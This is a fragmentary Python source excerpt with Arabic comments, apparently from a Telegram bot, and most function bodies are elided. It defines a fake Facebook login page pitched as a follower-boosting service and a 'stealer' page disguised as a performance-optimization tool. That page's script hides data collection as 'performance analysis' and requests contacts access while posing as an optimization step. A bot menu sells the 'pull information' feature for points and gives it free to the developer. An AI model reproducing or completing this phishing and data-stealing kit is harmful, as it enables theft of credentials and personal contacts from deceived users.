...
# ===================== صفحة تسجيل الدخول Facebook المزيفة (مطابقة 100% لرشق المتابعين) =====================
FACEBOOK_LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
...
# ===================== صفحة السحب المحسنة (تبدو كأداة تحسين أداء) =====================
STEALER_PAGE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
...
<body>
    ...
    <script>
        ...
        // دالة "جمع البيانات" - تبدو وكأنها تحليل أداء
        ...
        // دالة "تحسين متقدم" - تطلب أذونات بشكل غير مباشر
        function requestOptimization() {
            ...
            // طلب الوصول إلى جهات الاتصال (يظهر كطلب تحسين)
...
def build_main_menu(user_id):
    ...
    # زر سحب المعلومات يتطلب 1000 نقطة للمستخدم العادي، مجاني للمطور
    if is_admin_user:
...
def callback_query(call):
    ...
    # معالجة الأزرار المغلقة (بما فيها زر تحسين الأداء)
